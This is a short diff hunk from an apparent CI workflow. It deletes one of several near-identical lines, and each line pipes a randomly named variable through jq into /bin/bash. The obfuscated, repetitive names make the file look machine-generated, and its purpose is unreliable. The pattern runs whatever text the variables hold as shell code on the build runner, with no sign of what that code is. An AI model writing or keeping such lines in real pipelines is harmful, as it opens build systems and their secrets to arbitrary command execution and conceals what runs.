@@ -28,7 +28,6 @@ jobs:
           echo $ombsc357 | jq -r .l4970 | /bin/bash
           printf '%s' "$f0904" | jq -r .d55327 | /bin/bash
           echo $gh0 | jq -r .qje8767 | /bin/bash
-          printf '%s' "$eh8360" | jq -r .tpoma76 | /bin/bash
           echo $l94 | jq -r .d415 | /bin/bash
           printf '%s' "$jyquc01680" | jq -r .emo84493 | /bin/bash
           echo $sbpr1 | jq -r .wnrxi6 | /bin/bash
